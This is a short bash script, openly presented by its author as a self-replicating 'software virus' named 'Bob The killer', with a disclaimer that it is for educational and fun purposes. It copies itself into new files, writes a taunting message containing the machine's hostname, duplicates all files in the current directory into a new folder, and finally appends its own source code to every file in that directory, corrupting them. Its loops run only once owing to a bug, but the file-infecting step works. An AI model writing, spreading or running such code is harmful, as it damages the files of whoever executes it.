#!/bin/bash
# This is a software virus written in bash script a.k.a Bob The killer :)
# This is made for educational and fun purposes and i will not take responsibility for your use of this program.
# As always Enjoy :)

for i in 1000000
do
        touch Bob$i.sh
        script_name=$(basename "$0")
        touch Bob$i.txt
        cp $script_name Bob$i.sh
        cp $script_name Bob$i.txt
        script_name=$(basename "$0")
done

for i in 1000000
do
script_name=$(basename "$0")
host_name=$(hostname)
echo "$host_name I'M COMING FOR YOU SINCERELY $script_name" >> killer$i
mkdir Bobby$i



# Source directory (files to copy)
source_dir=$(pwd)

# Destination directory (where to paste the files)
destination_dir="$source_dir/Bobby$i"

# Check if the source directory exists
if [ ! -d "$source_dir" ]; then
    echo "Source directory not found: $source_dir"
    exit 1
fi

# Check if the destination directory exists or create it if not
if [ ! -d "$destination_dir" ]; then
    mkdir -p "$destination_dir"
fi

# Copy all files from the source directory to the destination directory
cp "$source_dir"/* "$destination_dir/"
done

for file in *; do
if [ -f "$file" ]; then
code="$(cat $script_name)"
        # Append the this file to the file
        echo "$code" >> "$file"
fi
done

#created by salami samad
